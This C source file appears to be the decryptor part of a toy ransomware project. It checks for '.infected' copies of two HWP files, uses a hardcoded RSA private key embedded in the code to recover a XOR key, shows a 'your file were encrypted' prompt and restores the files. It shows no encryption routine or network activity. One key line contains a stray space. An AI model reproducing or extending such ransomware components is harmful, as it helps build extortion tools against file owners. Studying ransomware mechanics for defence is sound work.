#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>

#pragma warning(disable: 4996)

#define TARGET_SIZE 2
char target[TARGET_SIZE][100] = { "test1.HWP", "test2.HWP" }; // encrypt target file
int padding = RSA_PKCS1_PADDING;

int xor_key;

char privateKey[] = "-----BEGIN RSA PRIVATE KEY-----\n"\
"MIIEowIBAAKCAQEAy8Dbv8prpJ/0kKhlGeJYozo2t60EG8L0561g13R29LvMR5hy\n"\
"vGZlGJpmn65+A4xHXInJYiPuKzrKUnApeLZ+vw1HocOAZtWK0z3r26uA8kQYOKX9\n"\
"Qt/DbCdvsF9wF8gRK0ptx9M6R13NvBxvVQApfc9jB9nTzphOgM4JiEYvlV8FLhg9\n"\
"yZovMYd6Wwf3aoXK891VQxTr/kQYoq1Yp+68i6T4nNq7NWC+UNVjQHxNQMQMzU6l\n"\
"WCX8zyg3yH88OAQkUXIXKfQ+NkvYQ1cxaMoVPpY72+eVthKzpMeyHkBn7ciumk5q\n"\
"gLTEJAfWZpe4f4eFZj/Rc8Y8Jj2IS5kVPjUywQIDAQABAoIBADhg1u1Mv1hAAlX8\n"\
"omz1Gn2f4AAW2aos2cM5UDCNw1SYmj+9SRIkaxjRsE/C4o9sw1oxrg1/z6kajV0e\n"\
"N/t008FdlVKHXAIYWF93JMoVvIpMmT8jft6AN/y3NMpivgt2inmmEJZYNioFJKZG\n"\
"X+/vKYvsVISZm2fw8NfnKvAQK55yu+GRWBZGOeS9K+LbYvOwcrjKhHz66m4bedKd\n"\
"gVAix6NE5iwmjNXktSQlJMCjbtdNXg/xo1/G4kG2p/MO1HLcKfe1N5FgBiXj3Qjl\n"\
"vgvjJZkh1as2KTgaPOBqZaP03738VnYg23ISyvfT/teArVGtxrmFP7939EvJFKpF\n"\
"1wTxuDkCgYEA7t0DR37zt+dEJy+5vm7zSmN97VenwQJFWMiulkHGa0yU3lLasxxu\n"\
"m0oUt ndIjenIvSx6t3Y+agK2F3EPbb0AZ5wZ1p1IXs4vktgeQwSSBdqcM8LZFDvZ\n"\
"uPboQnJoRdIkd62XnP5ekIEIBAfOp8v2wFpSfE7nNH2u4CpAXNSF9HsCgYEA2l8D\n"\
"JrDE5m9Kkn+J4l+AdGfeBL1igPF3DnuPoV67BpgiaAgI4h25UJzXiDKKoa706S0D\n"\
"4XB74zOLX11MaGPMIdhlG+SgeQfNoC5lE4ZWXNyESJH1SVgRGT9nBC2vtL6bxCVV\n"\
"WBkTeC5D6c/QXcai6yw6OYyNNdp0uznKURe1xvMCgYBVYYcEjWqMuAvyferFGV+5\n"\
"nWqr5gM+yJMFM2bEqupD/HHSLoeiMm2O8KIKvwSeRYzNohKTdZ7FwgZYxr8fGMoG\n"\
"PxQ1VK9DxCvZL4tRpVaU5Rmknud9hg9DQG6xIbgIDR+f79sb8QjYWmcFGc1SyWOA\n"\
"SkjlykZ2yt4xnqi3BfiD9QKBgGqLgRYXmXp1QoVIBRaWUi55nzHg1XbkWZqPXvz1\n"\
"I3uMLv1jLjJlHk3euKqTPmC05HoApKwSHeA0/gOBmg404xyAYJTDcCidTg6hlF96\n"\
"ZBja3xApZuxqM62F6dV4FQqzFX0WWhWp5n301N33r0qR6FumMKJzmVJ1TA8tmzEF\n"\
"yINRAoGBAJqioYs8rK6eXzA8ywYLjqTLu/yQSLBn/4ta36K8DyCoLNlNxSuox+A5\n"\
"w6z2vEfRVQDq4Hm4vBzjdi3QfYLNkTiTqLcvgWZ+eX44ogXtdTDO7c+GeMKWz4XX\n"\
"uJSUVL5+CVjKLjZEJ6Qc2WZLl94xSwL71E41H4YciVnSCQxVc4Jw\n"\
"-----END RSA PRIVATE KEY-----\n";

int isInfected();
int getKey();
void question();

int private_decrypt(unsigned char* enc_data, int data_len, unsigned char* key, unsigned char* decrypted);
void printLastError(char* msg);

int main()
{
	if (!isInfected()) 
	{
		printf("infected file not found");
		return -1;
	} 

    getKey();
}

void decrypt(char* file)
{
    FILE* fp = NULL;
    char infected_file[100];
    strcpy(infected_file, file);
    strcat(infected_file, ".infected");

    printf("infected : %s\n", infected_file);
    printf("decrypted : %s\n", file);

    if ((fp = fopen(infected_file, "rb")) == NULL) {
        printf("FILE NOT FOUNDED\n");
        exit(-1);
    }

    FILE* create_fp = fopen(file, "wb"); // dec

    int ch; // file char
    while ((ch = fgetc(fp)) != EOF)
    {
        ch ^= xor_key;
        printf(".");
        fputc(ch, create_fp);
    }

    puts("");
    fclose(create_fp);
    fclose(fp);

    remove((const char*) infected_file);

    puts("decrypt ok\n");
}

void question()
{
    int answer = 0;
    printf("\n+==============================+\n\n");
    printf("   your file were encrypted!!     \n\n");
    printf("+==============================+\n\n");
    printf("   target : %s, %s\n\n", target[0], target[1]);
    printf("+==============================+\n\n");

    do {
        printf("INPUT KEY : ");
        scanf("%d", &answer);
    } while (xor_key != answer);

    printf("OK.\n\n");
    for (int i = 0; i < TARGET_SIZE; i++) {
        decrypt(target[i]);
    }
    remove("encrypted_key");
}


int isInfected() 
{
	char fname[100] = "";
    FILE* fp;
	for (int idx = 0; idx < TARGET_SIZE; idx++)
	{
		strcpy(fname, target[idx]);
		strcat(fname, ".infected");
		if (!(fp = fopen(fname, "rb"))) // is infected?
		{
			return 0; // fopen() fail
		}
        fclose(fp);
	}
	return 1; // file infected
}

int getKey()
{
    unsigned char decrypted[4098] = "";
    unsigned char encrypted_str[4098] = "";
    unsigned char buffer[4098] = "";

    /* load key (file to string) */
    FILE* fp = fopen("encrypted_key", "rb");

    while (fgets(buffer, sizeof(buffer), fp)) {
        strcat(encrypted_str, buffer);
    }
    fclose(fp);

    int encrypted_length = 256;
    /* key decrypt */
    int decrypted_length = private_decrypt(encrypted_str, encrypted_length, privateKey, decrypted);

    if (decrypted_length == -1)  // RSA_private_decrypt() returns -1 on error
    {
        printLastError("\nPrivate Decrypt failed\n");
        exit(0);
    }

    decrypted[decrypted_length] = '\0';
    xor_key = atoi(decrypted);

    question();
}

RSA* createRSA(unsigned char* key, int public)
{
    RSA* rsa = NULL;
    BIO* keybio;
    keybio = BIO_new_mem_buf(key, -1); // 읽기 전용 메모리 만들기 BIO
    if (keybio == NULL)
    {
        printf("Failed to create key BIO");
        return 0;
    }

    /* PEM형식인 키 파일을 읽어와서 RSA 구조체 형식으로 변환 */

    if (public) // PEM public 키로 RSA 생성
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
    }
    else // PEM private 키로 RSA 생성
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
    }
     
    if (rsa == NULL)
    {
        printf("Failed to create RSA");
    }

    return rsa;
}

/* 개인키로 복호화 */
int private_decrypt(unsigned char* enc_data, int data_len, unsigned char* key, unsigned char* decrypted)
{
	RSA* rsa = createRSA(key, 0);
	int result = RSA_private_decrypt(data_len, enc_data, decrypted, rsa, padding);
	return result;
}

void printLastError(char* msg)
{
    char* err = malloc(130);
    ERR_load_crypto_strings();
    ERR_error_string(ERR_get_error(), err);
    printf("%s ERROR: %s\n", msg, err);
    free(err);
}
